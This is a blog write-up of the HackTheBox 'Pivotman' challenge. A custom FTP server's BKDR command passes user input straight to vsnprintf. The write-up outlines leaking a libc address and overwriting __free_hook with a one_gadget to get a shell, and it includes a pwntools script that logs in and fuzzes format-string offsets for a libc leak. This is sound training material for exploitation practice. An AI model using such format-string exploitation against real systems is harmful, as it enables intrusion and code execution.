Author of the blog

Description​

Pivotman is a easy rated challenge from HackTheBox. Its a custom ftp server, which has a unique FTP command called BKDR which suffers from format string vulnerabilty. From that vulnerability, we'll leak libc address, calculate base address, and overwrite __free_hook with one_gadget in order to pop a shell.

Decompilation​

There are default commands of FTP but we need login first, checking the decompiled part where it checks compares for username and password, we get both of them works with ;).

Now BKDR does sound like backdoor, lets find a reference to it in decompiler and see how its working.

and that does look like a format string vulnerability since the buffer is straight being passed to vsnprintf. Testing theory confirms it.

Exploit​

Now let's start with a wrapper script to fuzz for address that could be potentially libc's address. After few hits, 2739 seems to have constant offset to the libc's base.

exploit.py
from pwn import *
import sys

e = context.binary = ELF('./chall')
libc = e.libc
try:
    host,port = sys.argv[1].split(":")
    p = remote(host,port)
except:
    p = e.process()

fuzz_payload = lambda x : p.sendlineafter(b'230 User logged in proceed \r\n', x.encode())

for i in range(2700, 2800):
    p = e.process()
    p.sendlineafter(b'220 Blablah FTP \r\n', b"USER ;)")
    p.sendlineafter(b'331 User name okay need password \r\n', b"PASS ;)")
    fuzz_payload(f"BKDR %{i}$p")
    p.recvuntil(b"431136 BKDR ")
    response = p.recvuntil(b" \r\n", drop=True)
    if b"0x7f" in response:
        print(f"Possible libc address at index {i} value {response}")

p.interactive()
